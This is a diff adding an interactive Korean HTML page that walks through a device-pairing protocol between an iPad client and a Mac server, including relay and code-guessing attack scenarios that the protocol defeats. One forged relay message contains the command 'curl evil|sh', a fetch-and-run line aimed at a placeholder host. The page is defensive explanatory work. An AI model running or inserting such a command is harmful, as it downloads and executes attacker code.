@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  :root {
+    --bg: #0b0f14;
+    --panel: #141a22;
+    --panel2: #1c2530;
+    --border: #2a3542;
+    --muted: #8a95a3;
+    --text: #c7d0da;
+    --cyan: #3fe6c4;
+    --amber: #ffb84d;
+    --red: #ff6b6b;
+    --blue: #6ea8ff;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--text); padding: 18px 16px;
+         font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif; }
+  .wrap { max-width: 860px; margin: 0 auto; }
+  .tabs { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 14px; }
+  .tabs button, .nav button {
+    font-family: inherit; font-size: 12.5px; font-weight: 700; color: var(--text);
+    background: var(--panel2); border: 1px solid var(--border); border-radius: 8px; padding: 7px 12px; cursor: pointer;
+  }
+  .tabs button.on { color: var(--bg); background: var(--cyan); border-color: var(--cyan); }
+  .nav { display: flex; align-items: center; gap: 10px; margin: 12px 0; }
+  .nav button:disabled { opacity: 0.35; cursor: default; }
+  .count { font-family: ui-monospace, Menlo, monospace; font-size: 12px; color: var(--muted); }
+  .stack { display: flex; flex-direction: column; gap: 10px; }
+  .side { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+  .side h2 { margin: 0; padding: 9px 12px; font-size: 12.5px; color: var(--muted); border-bottom: 1px solid var(--border);
+             display: flex; justify-content: space-between; gap: 8px; }
+  .side h2 b { color: var(--text); }
+  .state { font-family: ui-monospace, Menlo, monospace; font-size: 11.5px; color: var(--amber); white-space: nowrap; }
+  pre { margin: 0; padding: 8px 0; font-family: ui-monospace, Menlo, monospace; font-size: 11px; line-height: 1.7; }
+  .ln { display: block; padding: 0 12px; white-space: pre; color: #7d8896; border-left: 3px solid transparent; }
+  .ln.hot { color: var(--text); background: rgba(63, 230, 196, 0.12); border-left-color: var(--cyan); }
+  .lane { background: var(--panel2); border: 1px solid var(--border); border-radius: 12px; padding: 10px 12px; min-height: 58px; }
+  .dir { font-size: 12px; font-weight: 700; margin-bottom: 4px; }
+  .dir.up { color: var(--blue); } .dir.down { color: var(--cyan); }
+  .msg { font-family: ui-monospace, Menlo, monospace; font-size: 11.5px; word-break: break-all; color: var(--text); }
+  .note { margin-top: 10px; font-size: 13.5px; line-height: 1.6; min-height: 44px; }
+  .menu { margin: 8px 12px 10px; padding: 8px 10px; border-radius: 8px; background: rgba(255,184,77,0.12); font-size: 12px; color: var(--amber); }
+  .menu.off { display: none; }
+  .menu big { display: block; font-family: ui-monospace, Menlo, monospace; font-size: 20px; letter-spacing: 4px; color: var(--text); }
+  .menu.lock { background: rgba(255,107,107,0.12); color: var(--red); }
+  @media (max-width: 640px) {
+    pre { font-size: 10px; }
+    .ln { white-space: pre-wrap; padding-left: 12px; text-indent: 0; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tabs" id="tabs"></div>
+  <div class="stack">
+    <div class="side">
+      <h2><span><b>아이패드</b> DeckClient.swift</span><span class="state" id="ipadState"></span></h2>
+      <pre id="ipadCode"></pre>
+    </div>
+    <div class="lane"><div class="dir" id="dir"></div><div class="msg" id="msg"></div></div>
+    <div class="side">
+      <h2><span><b>맥</b> DeckServer.swift</span><span class="state" id="macState"></span></h2>
+      <div class="menu off" id="menu"></div>
+      <pre id="macCode"></pre>
+    </div>
+  </div>
+  <div class="note" id="note"></div>
+  <div class="nav">
+    <button id="prev">이전</button>
+    <button id="next">다음</button>
+    <span class="count" id="count"></span>
+  </div>
+</div>
+<script>
+const ipadLines = [
+  ["hello",    "send(.hello(deviceId: KeychainStore.deviceId(), deviceName: ..., nonce: clientNonce))"],
+  ["",         ""],
+  ["derive",   "let derived = try PairingCrypto.derive(privateKey: key, peerPublicKey: macPairingKey,"],
+  ["derive",   "                                       code: code, ...)"],
+  ["sendPair", "send(.pair(publicKey: mine.base64EncodedString(), proof: derived.clientProof))"],
+  ["",         ""],
+  ["needP",    "case .needPairing(let publicKey, let nonce):"],
+  ["needP2",   "    macPairingKey = Data(base64Encoded: publicKey); phase = .needsPairing(macName)"],
+  ["failed",   "case .pairingFailed(let remaining): phase = .pairingFailed(macName, remaining: remaining)"],
+  ["locked",   "case .pairingLocked: phase = .pairingLocked(macName)"],
+  ["paired",   "case .paired(let proof):"],
+  ["paired2",  "    guard derived.macProof == proof else { return rejectMac(\"pairing proof\") }"],
+  ["paired3",  "    KeychainStore.setToken(...); secure = SecureChannel(keys: ..., role: .client)"],
+  ["chal",     "case .challenge(let nonce, let proof):"],
+  ["chal2",    "    let keys = SessionKeys(token: token, clientNonce: clientNonce, macNonce: nonce)"],
+  ["chal3",    "    guard keys.macProof == proof else { return rejectMac(\"challenge proof\") }"],
+  ["chal4",    "    send(.auth(proof: keys.clientProof)); secure = SecureChannel(keys: keys, role: .client)"],
+  ["authz",    "case .authorized: phase = .connected(macName)"],
+  ["",         ""],
+  ["press",    "send(.press(page: page, index: index))      // secure.seal(text)로 봉투에 담긴다"],
+];
+const macLines = [
+  ["open",     "if session.stage == .authorized {"],
+  ["open2",    "    do { let body = try secure.open(text); handleAuthorized(...) }"],
+  ["open3",    "    catch { session.channel.cancel() }      // 서명이 틀리거나 다시 보낸 메시지"],
+  ["",         "}"],
+  ["hello",    "case (_, .hello(let deviceId, let deviceName, let clientNonce)):"],
+  ["trusted",  "    if let keys = authority.sessionKeys(deviceId: deviceId,"],
+  ["trusted",  "                                        clientNonce: clientNonce, macNonce: macNonce) {"],
+  ["sendChal", "        session.send(.challenge(nonce: macNonce, proof: keys.macProof))"],
+  ["begin",    "    } else { beginPairing(...) }     // needPairing(publicKey:, nonce:) 보냄"],
+  ["auth",     "case (.awaitingAuth, .auth(let proof)):"],
+  ["verify",   "    if keys.clientProof == proof { authorize(session, keys: keys) } else { beginPairing(...) }"],
+  ["pair",     "case (.awaitingPairing, .pair(let publicKey, let proof)):"],
+  ["submit",   "    switch authority.submit(clientPublicKey: ..., proof: proof, deviceId: deviceId) {"],
+  ["okPaired", "    case .paired(let token, let macProof):"],
+  ["okPaired", "        session.send(.paired(proof: macProof)); authorize(...)"],
+  ["wrong",    "    case .wrong(let remaining): session.send(.pairingFailed(remaining: remaining))"],
+  ["lock",     "    case .locked: lockPairing(session)"],
+  ["",         "    }"],
+];
+
+const HELLO = `{"deviceId":"27BA2EEE-…","deviceName":"iPad Pro 11-inch (M5)","nonce":"25924fd5a1992142baccddc7196b2d0e","type":"hello"}`;
+const scenarios = {
+  "처음 보는 기기": [
+    { ipad: ["hello"], up: HELLO, ipadState: "connecting", macState: "awaitingHello",
+      note: "연결이 열리면 아이패드는 기기 ID, 이름, 그리고 이번 접속용 무작위 값(nonce)을 보낸다." },
+    { mac: ["hello","trusted","begin"], down: `{"nonce":"561fc05697044ada74e1e5e21c030a88","publicKey":"K9mh0laAr19+XoHq4FlVqmsZ7G8fE3KzBTSoHfjpKn0=","type":"needPairing"}`, macState: "awaitingPairing", menu: "4821",
+      note: "허락한 적 없는 기기라 sessionKeys가 nil이다. 맥은 새 4자리 숫자와 새 임시 키를 만든다. 숫자는 메뉴바에만 띄우고, 아이패드에는 임시 공개 키만 보낸다." },
+    { ipad: ["needP","needP2"], ipadState: "needsPairing", macState: "awaitingPairing", menu: "4821",
+      note: "아이패드는 맥의 공개 키를 기억하고 숫자 입력 화면을 띄운다. 일부러 한 번 틀려 본다." },
+    { ipad: ["derive","sendPair"], up: `{"proof":"…(4812로 만든 증명)","publicKey":"…(아이패드 임시 공개 키)","type":"pair"}`, ipadState: "needsPairing", macState: "awaitingPairing", menu: "4821",
+      note: "아이패드도 임시 키를 만들고, 맥 공개 키와 자기 비밀 키로 공유 비밀을 계산한다. 거기에 친 숫자 4812를 섞어 증명을 만든다. 숫자는 보내지 않는다." },
+    { mac: ["pair","submit","wrong"], down: `{"remaining":4,"type":"pairingFailed"}`, macState: "awaitingPairing", menu: "4821",
+      note: "맥은 자기 비밀 키와 아이패드 공개 키로 같은 공유 비밀을 계산하고, 메뉴바 숫자 4821을 섞어 본다. 증명이 다르다. 숫자가 틀렸다는 뜻이다." },
+    { ipad: ["failed"], ipadState: "pairingFailed(4)", macState: "awaitingPairing", menu: "4821",
+      note: "\"숫자가 맞지 않아요. 4번 더 시도할 수 있어요.\"" },
+    { ipad: ["derive","sendPair"], up: `{"proof":"74290205ccc4cb16787f2fd6715e67ad64c6c5f61e992d72b35cf19a7b91e644","publicKey":"Y3OWDMLGuKb9BxCvMRF7SKgvYpv92h5uvOEVC5PIyFA=","type":"pair"}`, ipadState: "pairingFailed(4)", macState: "awaitingPairing", menu: "4821",
+      note: "이번엔 4821. 실제로 오간 메시지에도 공개 키와 증명뿐이다." },
+    { mac: ["pair","submit","okPaired"], down: `{"proof":"…(맥 증명)","type":"paired"}  그다음부터 {"type":"secure",…}`, macState: "authorized",
+      note: "증명이 맞다. 맥은 같은 계산으로 나온 토큰을 허락 목록에 저장하고, 자기도 같은 숫자를 안다는 증명을 보낸다. 토큰은 보내지 않는다. 여기서부터 맥이 보내는 건 전부 서명된 봉투다." },
+    { ipad: ["paired","paired2","paired3","authz"], ipadState: "connected", macState: "authorized",
+      note: "아이패드는 맥 증명까지 맞을 때만 토큰을 Keychain에 저장한다. 양쪽이 각자 계산한 토큰이 같다. 엿본 사람은 공개 키 두 개를 다 봤어도 비밀 키가 없어서 이 토큰을 못 만든다." },
+  ],
+  "허락한 기기": [
+    { ipad: ["hello"], up: HELLO, ipadState: "connecting", macState: "awaitingHello",
+      note: "맥 앱을 껐다 켰을 때. 인사는 처음과 같다. nonce는 접속마다 새로 만든다." },
+    { mac: ["hello","trusted","sendChal"], down: `{"nonce":"…(맥 nonce)","proof":"…(맥 증명)","type":"challenge"}`, macState: "awaitingAuth",
+      note: "허락한 기기다. 맥이 먼저 \"나는 토큰을 안다\"는 증명을 보낸다. 토큰과 두 nonce로 만든 값이라 토큰을 모르는 가짜 맥은 이걸 못 만든다." },
+    { ipad: ["chal","chal2","chal3","chal4"], up: `{"proof":"…(아이패드 증명)","type":"auth"}`, ipadState: "connecting", macState: "awaitingAuth",
+      note: "아이패드는 맥 증명부터 확인하고, 맞을 때만 자기 증명을 보낸다. 이 접속 전용 키도 같이 만들어 둔다." },
+    { mac: ["auth","verify"], down: `{"body":"{\"type\":\"authorized\"}","mac":"…","seq":1,"type":"secure"}`, macState: "authorized",
+      note: "맞으면 허락. authorized부터 이미 봉투에 담겨 온다." },
+    { ipad: ["authz"], ipadState: "connected", macState: "authorized",
+      note: "숫자 입력 없이 연결됨." },
+    { ipad: ["press"], up: `{"body":"{\"index\":0,\"page\":0,\"type\":\"press\"}","mac":"8e52f8a1139694633f8f5033707a431c0024f8bfd856cf71dadbe0fc5a973dc4","seq":2,"type":"secure"}`, ipadState: "connected", macState: "authorized",
+      note: "버튼을 누르면 이렇게 간다. 실제로 오간 봉투다. body가 원래 메시지고, mac이 이 접속 키로 만든 서명, seq가 번호다." },
+    { mac: ["open","open2"], ipadState: "connected", macState: "authorized",
+      note: "맥은 서명이 맞고 번호가 앞선 것보다 클 때만 열어서 실행한다." },
+  ],
+  "가짜 맥 중계": [
+    { ipad: ["hello"], up: HELLO, dir: "↓ 아이패드가 가짜 맥에 보냄, 가짜 맥이 그대로 진짜 맥에 넘김", ipadState: "connecting", macState: "awaitingHello",
+      note: "같은 와이파이의 누군가가 _touchdeck._tcp로 가짜 맥을 띄웠고, 아이패드가 거기 붙었다. 가짜 맥은 받은 걸 그대로 진짜 맥에 넘긴다." },
+    { mac: ["hello","trusted","sendChal"], down: `{"nonce":"…","proof":"…(진짜 맥 증명)","type":"challenge"}`, dir: "↑ 진짜 맥이 보냄, 가짜 맥이 그대로 아이패드에 넘김", macState: "awaitingAuth",
+      note: "진짜 맥이 만든 증명이라 아이패드 확인은 통과한다. 그대로 넘겨주기만 하면 여기까지는 막을 수 없다." },
+    { ipad: ["chal","chal3","chal4"], up: `{"proof":"…","type":"auth"}`, dir: "↓ 아이패드가 보냄, 가짜 맥이 그대로 넘김", ipadState: "connecting", macState: "awaitingAuth",
+      note: "아이패드 증명도 그대로 넘어간다. 진짜 맥은 가짜 맥의 연결을 허락하게 된다. 처음 버전(서명 없는 메시지)은 여기서 끝이었다. 이제 가짜 맥이 마음대로 버튼을 바꾸고 누를 수 있었다." },
+    { mac: ["auth","verify"], down: `{"body":"{\"type\":\"authorized\"}","mac":"…","seq":1,"type":"secure"}`, macState: "authorized",
+      note: "하지만 이제 허락 뒤의 모든 메시지는 토큰과 두 nonce로 만든 이 접속 전용 키로 서명해야 한다. 가짜 맥은 토큰을 모른다." },
+    { up: `{"body":"{\"type\":\"setButton\",...\"command\":\"curl evil|sh\"...}","mac":"(토큰 없이 만든 서명)","seq":2,"type":"secure"}`, dir: "↓ 가짜 맥이 지어낸 메시지", ipadState: "connected", macState: "authorized",
+      note: "가짜 맥이 명령 버튼을 새로 만들어 보내 본다. 서명을 만들 키가 없으니 아무 값이나 넣을 수밖에 없다." },
+    { mac: ["open","open2","open3"], macState: "닫힘",
+      note: "서명이 맞지 않아 진짜 맥이 연결을 끊는다. 가짜 맥이 할 수 있는 건 아이패드가 보낸 진짜 메시지를 그대로 넘기거나 버리는 것뿐이다. 내용을 바꾸면 서명이 깨지고, 같은 걸 두 번 보내면 번호에서 걸린다." },
+  ],
+  "숫자 찍어 보기": [
+    { ipad: ["hello"], up: `{"deviceId":"guest","deviceName":"손님 노트북","nonce":"…","type":"hello"}`, ipadState: "", macState: "awaitingHello",
+      note: "다른 기기가 스크립트로 숫자를 0000부터 넣어 보는 경우. 숫자마다 증명을 만들어 보내야 한다." },
+    { mac: ["hello","trusted","begin"], down: `{"nonce":"…","publicKey":"…","type":"needPairing"}`, macState: "awaitingPairing", menu: "4821",
+      note: "숫자는 메뉴바에만 뜬다. 상대는 볼 수 없다." },
+    { ipad: ["derive","sendPair"], up: `0000, 0001, 0002로 만든 증명 세 개`, ipadState: "", macState: "awaitingPairing", menu: "4821",
+      note: "세 번 연달아 틀린다." },
+    { mac: ["pair","submit","wrong"], down: `{"remaining":4} {"remaining":3} {"remaining":2}`, macState: "awaitingPairing", menu: "4821",
+      note: "남은 횟수가 줄어든다." },
+    { ipad: ["hello"], up: `{"deviceId":"guest",…,"type":"hello"}`, ipadState: "", macState: "awaitingPairing", menu: "4821",
+      note: "다시 인사해서 횟수를 처음으로 돌려 보려 한다. 처음 버전은 여기서 횟수가 5로 돌아가서, 이걸 반복하면 1만 개를 다 넣어 볼 수 있었다." },
+    { mac: ["hello","trusted","begin"], down: `{"nonce":"…","publicKey":"…","type":"needPairing"}`, macState: "awaitingPairing", menu: "4821",
+      note: "지금은 새 숫자와 새 키는 주지만 남은 횟수는 그대로 둔다." },
+    { ipad: ["derive","sendPair"], up: `0003, 0004로 만든 증명 두 개`, ipadState: "", macState: "awaitingPairing", menu: "4821",
+      note: "합쳐서 다섯 번째." },
+    { mac: ["pair","submit","wrong","lock"], down: `{"remaining":1,"type":"pairingFailed"}  {"type":"pairingLocked"}`, macState: "awaitingPairing", menu: "lock",
+      note: "다섯 번째에서 잠긴다. 그 뒤로는 맞는 숫자로 만든 증명도, 기기 ID를 바꾼 새 인사도 전부 pairingLocked. 해롤드가 맥 메뉴에서 \"새 기기 허락 다시 받기\"를 눌러야 풀린다." },
+  ],
+};
+
+let current = Object.keys(scenarios)[0], step = 0;
+const $ = id => document.getElementById(id);
+
+function renderCode(el, lines, hot) {
+  el.innerHTML = lines.map(([id, text]) =>
+    `<span class="ln${hot && hot.includes(id) && id ? " hot" : ""}">${text.replace(/&/g,"&amp;").replace(/</g,"&lt;") || " "}</span>`).join("");
+}
+
+function render() {
+  const s = scenarios[current][step];
+  renderCode($("ipadCode"), ipadLines, s.ipad);
+  renderCode($("macCode"), macLines, s.mac);
+  $("ipadState").textContent = s.ipadState ? "phase: " + s.ipadState : "";
+  $("macState").textContent = s.macState === "닫힘" ? "연결 끊음" : "stage: " + s.macState;
+  const menu = $("menu");
+  if (s.menu === "lock") { menu.className = "menu lock"; menu.innerHTML = "새 기기 허락을 멈췄어요<br>[새 기기 허락 다시 받기]"; }
+  else if (s.menu) { menu.className = "menu"; menu.innerHTML = "메뉴바: 이 숫자를 입력하세요<big>" + s.menu + "</big>"; }
+  else { menu.className = "menu off"; }
+  if (s.up) { $("dir").className = "dir up"; $("dir").textContent = s.dir || "↓ 아이패드가 맥에 보냄"; $("msg").textContent = s.up; }
+  else if (s.down) { $("dir").className = "dir down"; $("dir").textContent = s.dir || "↑ 맥이 아이패드에 보냄"; $("msg").textContent = s.down; }
+  else { $("dir").textContent = ""; $("msg").textContent = ""; }
+  $("note").textContent = s.note;
+  const n = scenarios[current].length;
+  $("count").textContent = `${step + 1} / ${n}`;
+  $("prev").disabled = step === 0;
+  $("next").disabled = step === n - 1;
+}
+
+for (const name of Object.keys(scenarios)) {
+  const b = document.createElement("button");
+  b.textContent = name;
+  b.onclick = () => { current = name; step = 0;
+    [...$("tabs").children].forEach(c => c.classList.toggle("on", c === b)); render(); };
+  if (name === current) b.classList.add("on");
+  $("tabs").appendChild(b);
+}
+$("prev").onclick = () => { if (step > 0) { step--; render(); } };
+$("next").onclick = () => { if (step < scenarios[current].length - 1) { step++; render(); } };
+render();
+</script>
+</body>
+</html>
